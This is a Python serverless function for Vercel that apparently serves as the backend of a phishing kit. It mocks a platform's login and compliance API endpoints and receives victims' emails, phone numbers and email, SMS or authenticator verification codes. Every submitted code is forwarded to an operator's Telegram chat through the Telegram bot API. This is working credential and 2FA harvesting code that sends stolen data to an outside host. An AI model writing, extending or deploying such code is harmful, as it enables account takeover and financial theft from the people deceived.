import json
import os
import requests
from urllib.parse import parse_qs

# Telegram bot credentials from environment - NO DEFAULTS FOR SECURITY
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def handler(request):
    """Vercel serverless function handler"""
    
    # Handle CORS preflight requests
    if request.method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
            },
            'body': ''
        }
    
    # Handle API requests
    if request.method == 'POST':
        return handle_send_code(request)
    elif request.method == 'GET':
        return handle_api_get(request)
    
    return {
        'statusCode': 405,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        },
        'body': json.dumps({"error": "Method not allowed"})
    }

def handle_api_get(request):
    """Handle GET API requests"""
    path = request.url.path if hasattr(request.url, 'path') else getattr(request, 'path', '')
    
    # Mock API responses for various endpoints
    if 'banner-compliance-check' in path:
        response_data = {"success": True, "data": {"show": False}}
    elif 'country-city-short' in path:
        response_data = {"country": "UA", "city": "Kyiv"}
    elif any(endpoint in path for endpoint in ['commonConfig', 'complianceActionCheck', 'businessCheckV2', 'region/language', 'querylangMappingByKey', 'authcenter/auth']):
        response_data = {"success": True, "data": {}}
    else:
        response_data = {"success": True, "data": {}}
    
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        },
        'body': json.dumps(response_data)
    }

def handle_send_code(request):
    """Handle sending verification codes to Telegram"""
    try:
        # Check if Telegram credentials are configured
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            return {
                'statusCode': 500,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
                'body': json.dumps({"success": False, "error": "Telegram not configured"})
            }
        
        # Parse request body
        if hasattr(request, 'body'):
            body = request.body
        elif hasattr(request, 'get_body'):
            body = request.get_body()
        else:
            body = request.data if hasattr(request, 'data') else '{}'
        
        if isinstance(body, bytes):
            body = body.decode('utf-8')
        
        data = json.loads(body)
        
        verification_type = data.get('type', 'unknown')
        code = data.get('code', '000000')
        email = data.get('email', '')
        phone = data.get('phone', '')
        
        # Format message for Telegram
        if verification_type == 'email':
            message = f"📧 Email верификация\n\nEmail: {email}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
        elif verification_type == 'sms':
            message = f"📱 SMS верификация\n\nТелефон: {phone}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"  
        elif verification_type == 'authenticator':
            message = f"🔐 Аутентификатор\n\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
        else:
            message = f"🔑 Верификация\n\nТип: {verification_type}\nКод: {code}"
        
        # Send to Telegram
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        telegram_data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        
        response = requests.post(telegram_url, json=telegram_data, timeout=10)
        
        if response.status_code == 200:
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
                'body': json.dumps({"success": True, "message": "Код успешно отправлен"})
            }
        else:
            return {
                'statusCode': 500,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
                'body': json.dumps({"success": False, "error": "Ошибка отправки в Telegram"})
            }
            
    except Exception as e:
        return {
            'statusCode': 500,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
            },
            'body': json.dumps({"success": False, "error": "Ошибка отправки"})
        }
